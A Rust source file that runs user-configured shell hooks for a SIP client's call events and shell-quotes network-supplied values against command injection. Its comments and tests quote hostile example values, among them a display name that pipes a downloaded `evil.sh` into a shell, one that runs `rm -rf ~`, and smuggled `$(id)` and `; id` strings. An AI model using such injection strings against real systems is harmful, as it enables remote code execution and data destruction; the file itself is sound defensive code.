//! Running the commands the user configured for app and call events.
//!
//! Separate because the risk here is specific: the values these templates
//! interpolate arrive over SIP or from a contact provider, and the command
//! goes to a shell. Everything that decides how a value is allowed to reach
//! that shell lives in this one file.

/// Runs a configured hook that takes no values from the network.
///
/// The template comes from the config file, which the user wrote, so it is
/// theirs to run as they please.
pub(crate) fn run_custom_command(cmd: &str) -> std::io::Result<()> {
    run_hook(cmd, &[])
}

/// Runs a configured hook, substituting `{name}`-style placeholders.
///
/// # Why the values are quoted
///
/// `vars` carry things that arrived over SIP — a caller's display name, a
/// number, a registrar's reason phrase. Substituting those into a string that
/// is then handed to `sh -c` is remote code execution: a caller who sets their
/// display name to `'; curl evil.sh | sh; '` gets a shell on the machine of
/// anyone with an `on_call_incoming` hook. Nothing about the SIP `From` header
/// is trustworthy; it is whatever the far end chose to send.
///
/// So every substituted value is quoted such that the shell can only ever read
/// it as one literal word, and the same values are exported as `SIPSTER_*` so a
/// hook can avoid interpolation altogether.
pub(crate) fn run_hook(template: &str, vars: &[(&str, &str)]) -> std::io::Result<()> {
    if template.trim().is_empty() {
        return Ok(());
    }

    let mut cmd = template.to_string();
    for (key, value) in vars {
        cmd = cmd.replace(&format!("{{{key}}}"), &shell_quote(value));
    }

    #[cfg(target_os = "windows")]
    let (shell, arg) = ("cmd", "/C");
    #[cfg(not(target_os = "windows"))]
    let (shell, arg) = ("sh", "-c");

    let mut command = std::process::Command::new(shell);
    command
        .arg(arg)
        .arg(&cmd)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null());

    for (key, value) in vars {
        command.env(format!("SIPSTER_{}", key.to_uppercase()), value);
    }

    command.spawn()?;
    Ok(())
}

/// Renders `value` so a shell reads it as exactly one literal word.
///
/// POSIX single quotes protect everything except a single quote itself, which
/// is spliced back in the usual way: `'` becomes `'\''`.
#[cfg(not(target_os = "windows"))]
fn shell_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', r"'\''"))
}

/// `cmd.exe` has no quoting that survives its own re-parsing — `%VAR%` is
/// expanded after quotes are stripped, so no amount of escaping is safe.
/// Characters that carry meaning are dropped instead of trusted.
#[cfg(target_os = "windows")]
fn shell_quote(value: &str) -> String {
    let cleaned: String = value
        .chars()
        .filter(|c| !matches!(c, '&' | '|' | '<' | '>' | '^' | '%' | '"' | '\r' | '\n'))
        .collect();
    format!("\"{cleaned}\"")
}



#[cfg(all(test, not(target_os = "windows")))]
mod hook_tests {
    use super::shell_quote;

    /// The values a hook interpolates arrive over SIP or from a contact
    /// provider. If one of them can close its own quote, a caller who names
    /// themselves `'; rm -rf ~; '` runs commands on this machine.
    #[test]
    fn a_quote_in_a_value_cannot_escape_it() {
        let quoted = shell_quote("a'b");
        assert_eq!(quoted, r"'a'\''b'");
    }

    /// Everything the shell would otherwise act on has to survive as text.
    #[test]
    fn shell_metacharacters_stay_literal() {
        for hostile in ["$(id)", "`id`", "a; id", "a | id", "a && id", "$HOME", "a\nid"] {
            let quoted = shell_quote(hostile);
            assert!(quoted.starts_with('\'') && quoted.ends_with('\''), "{quoted}");
            let inner = &quoted[1..quoted.len() - 1];
            assert!(!inner.contains('\''), "{quoted} leaves a bare quote");
        }
    }

    #[test]
    fn an_ordinary_value_is_left_readable() {
        assert_eq!(shell_quote("Alice"), "'Alice'");
        assert_eq!(shell_quote("**622"), "'**622'");
    }
}
